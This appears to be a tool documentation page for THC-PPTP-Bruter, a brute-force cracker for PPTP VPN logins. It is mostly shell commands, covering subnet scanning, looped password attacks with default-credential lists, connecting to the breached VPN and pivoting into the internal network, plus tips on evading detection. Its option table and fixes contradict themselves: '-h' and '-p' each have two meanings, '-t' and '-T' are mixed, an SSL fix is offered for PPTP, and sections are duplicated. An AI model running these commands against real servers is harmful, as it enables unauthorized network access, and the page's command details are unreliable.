---
title: "THC-PPTP-Bruter - PPTP VPN Brute-Force Tool"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Brute Force"
  - "Credential Access"
  - "VPN Attacks"
tags:
  - "thc-pptp-bruter"
  - "brute-force"
  - "pptp"
  - "vpn"
  - "password-cracking"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: Brute Force
mitre_technique_id: T1110
version: "latest"
tool_url: "https://github.com/galkan/thc-pptp-bruter"
kali_url: "https://www.kali.org/tools/thc-pptp-bruter/"
license: "GPL-2.0"
---

# THC-PPTP-Bruter - PPTP VPN Brute-Force Tool

## Overview

**THC-PPTP-Bruter** is a specialized brute-force tool designed for attacking Point-to-Point Tunneling Protocol (PPTP) VPN servers. It implements the PPTP authentication protocol to perform credential brute-forcing against VPN endpoints, making it an essential tool for testing VPN security.

**Key Features**:
- **PPTP specialized** - Optimized for PPTP VPN attacks
- **MS-CHAPv2 support** - Handles Microsoft Challenge-Handshake Authentication Protocol
- **Multi-threaded** - Parallel connections for faster attacks
- **Session management** - Resume interrupted attacks
- **Rate limiting** - Built-in delays to avoid detection
- **Logging** - Comprehensive attack logging

**Supported Features**:
- **PPTP Authentication** - MS-CHAPv2 protocol support
- **Multiple connections** - Parallel brute-force attempts
- **Custom ports** - Non-default PPTP ports
- **Domain support** - Works with domain-joined VPN servers
- **Resume capability** - Continue interrupted attacks

## Installation

### Kali Linux (APT)

```bash
sudo apt install -y thc-pptp-bruter
```

### From Source

```bash
# Install dependencies
sudo apt install -y build-essential

# Clone and build
git clone https://github.com/galkan/thc-pptp-bruter
cd thc-pptp-bruter
./configure
make
sudo make install
```

## Command Reference

### Core Options

| Option | Description |
|--------|-------------|
| `-h HOST` | Target VPN server hostname or IP |
| `-p PORT` | Target port (default: 1723) |
| `-u USERNAME` | Single username |
| `-U FILE` | Username list file |
| `-p PASSWORD` | Single password |
| `-P FILE` | Password list file |
| `-d DOMAIN` | Windows domain name |
| `-t THREADS` | Number of threads (default: 1) |
| `-o OUTPUT` | Output file |
| `-v` | Verbose output |
| `-q` | Quiet mode |
| `-h` | Show help |

### Authentication Modes

**Single User, Password List**:
```bash
thc-pptp-bruter -h 192.168.1.100 -u administrator -P /usr/share/wordlists/rockyou.txt
```

**User List, Password List**:
```bash
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt
```

**Domain Authentication**:
```bash
thc-pptp-bruter -h 192.168.1.100 -u administrator -P passwords.txt -d CORP
```

## Usage Examples

### Basic PPTP Brute Force

**Single User, Password List**:
```bash
thc-pptp-bruter -h 192.168.1.100 -u administrator -P /usr/share/wordlists/rockyou.txt
```

**User List, Password List**:
```bash
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt
```

**Custom Port**:
```bash
thc-pptp-bruter -h 192.168.1.100 -p 17230 -u administrator -P passwords.txt
```

### Domain Authentication

**Single User, Password List**:
```bash
thc-pptp-bruter -h 192.168.1.100 -u administrator -P passwords.txt -d CORP
```

**User List, Password List**:
```bash
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -d CORP
```

### Multiple Threads

```bash
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -t 10
```

### Output to File

```bash
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -o results.txt
```

### Verbose Output

```bash
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -v
```

### Discovery and Attack

```bash
# 1. Find PPTP servers
nmap -p 1723 --open 192.168.1.0/24 -oG - > pptp_hosts.txt

# 2. Extract targets
grep "1723/open" pptp_hosts.txt | awk '{print $2}' > targets.txt

# 3. Brute force
for host in $(cat targets.txt); do
    thc-pptp-bruter -h $host -U usernames.txt -P passwords.txt
done
```

### Default Credentials

```bash
# Common PPTP default credentials
echo "admin:" > default_creds.txt
echo "admin:admin" >> default_creds.txt
echo "admin:password" >> default_creds.txt
echo "admin:Password1" >> default_creds.txt
echo "administrator:" >> default_creds.txt
echo "administrator:admin" >> default_creds.txt
echo "administrator:password" >> default_creds.txt

thc-pptp-bruter -h 192.168.1.100 -U default_users.txt -P default_creds.txt
```

### Integration with Other Tools

```bash
# After finding credentials, connect to VPN
pptpsetup --create vpn_tunnel --server 192.168.1.100 --username administrator --password password123 --donotrout
pppd call vpn_tunnel
```

## Output Interpretation

### Successful Login

```
[+] Found valid credentials: administrator:password123
```

### Failed Attempt

```
[-] Invalid credentials: administrator:wrongpass
```

### Connection Errors

```
[-] Connection refused: 192.168.1.100:1723
[-] PPTP authentication failed
```

## Integration with Other Tools

### Nmap + THC-PPTP-Bruter Workflow

```bash
# 1. Find PPTP servers
nmap -p 1723 --open 192.168.1.0/24 -oA nmap_pptp

# 2. Extract targets
grep "1723/open" nmap_pptp.gnmap | awk '{print $2}' > pptp_targets.txt

# 3. Brute force
for host in $(cat pptp_targets.txt); do
    thc-pptp-bruter -h $host -U usernames.txt -P passwords.txt
done
```

### VPN Connection

```bash
# After finding credentials
pptpsetup --create vpn_tunnel --server 192.168.1.100 --username administrator --password password123 --donotrout
pppd call vpn_tunnel

# Verify connection
ifconfig ppp0
```

### Network Pivoting

```bash
# After VPN connection
# Set up routes to internal network
route add -net 10.0.0.0/8 dev ppp0

# Use internal network
nmap -p 22,80,445,3306,3389 10.0.0.0/24
```

## Operational Security

### Rate Limiting

```bash
# Reduce thread count
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -t 1

# Add delay between attempts
sleep 1
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -t 1
```

### Logging

```bash
# Enable verbose output
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -v

# Log to file
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -o results.txt
```

## Common Issues and Troubleshooting

### Issue: "Connection refused"

**Cause**: PPTP server not running or firewall blocking.

**Solution**:
```bash
# Verify PPTP is running
nmap -p 1723 192.168.1.100

# Test connection manually
telnet 192.168.1.100 1723
```

### Issue: "Authentication failed"

**Cause**: Wrong credentials or authentication mode.

**Solution**:
```bash
# Check credentials
thc-pptp-bruter -h 192.168.1.100 -u administrator -P passwords.txt -v

# Try domain authentication
thc-pptp-bruter -h 192.168.1.100 -u administrator -P passwords.txt -d CORP
```

### Issue: "Timeout"

**Cause**: Network latency or server overload.

**Solution**:
```bash
# Increase timeout
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -t 1

# Reduce thread count
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -t 1
```

### Issue: "SSL certificate errors"

**Cause**: Self-signed or invalid SSL certificates.

**Solution**:
```bash
# Try different SSL options
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt --encrypt
```

## Best Practices

### Wordlist Preparation

```bash
# Use common PPTP passwords
echo "admin:" > pptp_passwords.txt
echo "admin:admin" >> pptp_passwords.txt
echo "admin:password" >> pptp_passwords.txt
echo "admin:Password1" >> pptp_passwords.txt
echo "administrator:" >> pptp_passwords.txt
echo "administrator:admin" >> pptp_passwords.txt
echo "administrator:password" >> pptp_passwords.txt

# Combine with rockyou.txt
cat /usr/share/wordlists/rockyou.txt pptp_passwords.txt | sort -u > combined.txt
```

### Parallel Attacks

```bash
# Attack multiple PPTP servers
for host in $(cat pptp_hosts.txt); do
    thc-pptp-bruter -h $host -U usernames.txt -P passwords.txt -T 5 &
done
wait
```

### Default Credentials

```bash
# Common default credentials
echo "admin:" > default_creds.txt
echo "admin:admin" >> default_creds.txt
echo "admin:password" >> default_creds.txt
echo "admin:Password1" >> default_creds.txt
echo "administrator:" >> default_creds.txt
echo "administrator:admin" >> default_creds.txt
echo "administrator:password" >> default_creds.txt
```

## Resources

- **GitHub Repository**: https://github.com/galkan/thc-pptp-bruter
- **Kali Linux Tools**: https://www.kali.org/tools/thc-pptp-bruter/
- **License**: GPL-2.0

## Related Tools

- **Hydra**: More protocol support, faster for standard protocols
- **Medusa**: Modular design, good for parallel testing
- **Patator**: Advanced features, more flexible but complex
- **Ncrack**: Network authentication cracking, good for large-scale audits
